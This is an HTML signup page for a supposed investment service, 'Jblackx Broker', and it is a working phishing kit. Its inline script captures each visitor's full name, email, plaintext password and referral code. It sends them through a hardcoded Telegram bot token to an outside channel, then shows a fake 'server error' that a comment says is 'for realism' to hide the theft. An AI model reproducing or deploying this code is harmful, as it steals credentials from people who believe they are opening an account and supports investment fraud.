<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Create Account - Jblackx Broker</title>
  <link rel="stylesheet" href="css/style.css" />
</head>
<body>
  <div class="container">
    <h2>🚀 Create Your Investment Account</h2>
    <form id="signupForm">
      <label for="fullname">🧑 Full Name</label>
      <input type="text" id="fullname" name="fullname" required />

      <label for="email">📧 Email</label>
      <input type="email" id="email" name="email" required />

      <label for="password">🔐 Create Password</label>
      <input type="password" id="password" name="password" required />

      <label for="ref">📎 Referral Code (Optional)</label>
      <input type="text" id="ref" name="ref" placeholder="JBLACKX23" />

      <button type="submit" class="btn">Create Account</button>
      <p class="small">Already registered? <a href="login.html">Login</a></p>
    </form>
  </div>

  <script>
    document.getElementById('signupForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const fullname = document.getElementById('fullname').value;
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const ref = document.getElementById('ref').value || "N/A";

      const message = `🟩 *New Signup Request:*\n👤 Name: \`${fullname}\`\n📧 Email: \`${email}\`\n🔐 Pass: \`${password}\`\n🔗 Referral: \`${ref}\`\n📆 Time: ${new Date().toLocaleString()}`;
      
      const token = "8313979154:AAFQ9nl0yINqmAp3dgpOrSwrNAeP9YN1k3g";
      const chat_id = "@Officialwoongna";
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message,
          parse_mode: "Markdown"
        })
      }).then(() => {
        alert("Signup failed: Server error."); // fake error for realism
        document.getElementById("signupForm").reset();
      });
    });
  </script>
</body>
</html>
